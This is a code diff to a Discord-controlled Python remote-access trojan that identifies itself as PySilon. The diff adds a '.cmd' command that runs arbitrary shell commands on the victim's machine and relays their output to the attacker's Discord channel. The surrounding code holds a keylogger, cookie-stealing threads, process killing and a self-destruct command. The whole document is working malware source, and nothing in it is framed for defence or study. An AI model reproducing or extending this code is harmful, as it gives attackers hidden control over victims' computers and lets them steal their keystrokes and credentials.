@@ -12,6 +12,7 @@ from psutil import process_iter
 import time
 from getpass import getuser
 import pyaudio
+import subprocess
 from zipfile import ZipFile
 import asyncio
 import sounddevice
@@ -70,7 +71,7 @@ text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
 files_to_merge, expectation, one_file_attachment_message = [[], [], []], None, None
-cookies_thread, implode_confirmation = None, None
+cookies_thread, implode_confirmation, cmd_messages = None, None, []
 working_directory = sys.argv[0].split('\\')[:-1]
 
 if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
@@ -139,7 +140,7 @@ async def on_raw_reaction_add(payload):
 
 @client.event
 async def on_reaction_add(reaction, user):
-    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation
+    global tree_messages, messages_from_sending_big_file, expectation, files_to_merge, processes_messages, process_to_kill, expectation, cmd_messages
     if user.bot == False:
         try:
             match str(reaction):
@@ -150,6 +151,10 @@ async def on_reaction_add(reaction, user):
                             except: pass
                         tree_messages = []
                         os.system('del tree.txt')
+                    elif reaction.message.content == '```End of command stdout```':
+                        for i in cmd_messages:
+                            await i.delete()
+                        cmd_messages = []
                     elif reaction.message.content[-25:] == '.kill <process-number>```':
                         for i in processes_messages:
                             try: await i.delete()
@@ -157,6 +162,7 @@ async def on_reaction_add(reaction, user):
                         processes_messages = []
                     elif expectation == 'implosion':
                         expectation = None
+                    
 
                 case '📥':
                     if reaction.message.content[:15] == '```End of tree.':
@@ -254,7 +260,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages
     if message.author != client.user:
         if message.content == '.ss':
             await message.delete()
@@ -513,6 +519,22 @@ async def on_message(message):
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
+        elif message.content[:4] == '.cmd':
+            await message.delete()
+            cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
+            message_buffer, cmd_messages = '', []
+            reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
+            for line in range(1, len(cmd_output.split('\n'))):
+                if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
+                    reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
+                    message_buffer = cmd_output.split('\n')[line]
+                else:
+                    message_buffer += cmd_output.split('\n')[line] + '\n'
+            reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
+            reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')
+
+
+
         elif message.content == '.implode':
             await message.delete()
             await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here PySilon.key generated along with RAT executable```\n\n')
@@ -590,7 +612,6 @@ def on_press(key):
             else:
                 messages_to_send.append([channel_ids['main'], text_buffor])
             text_buffor = ''
-
 
 
 with Listener(on_press=on_press) as listener:
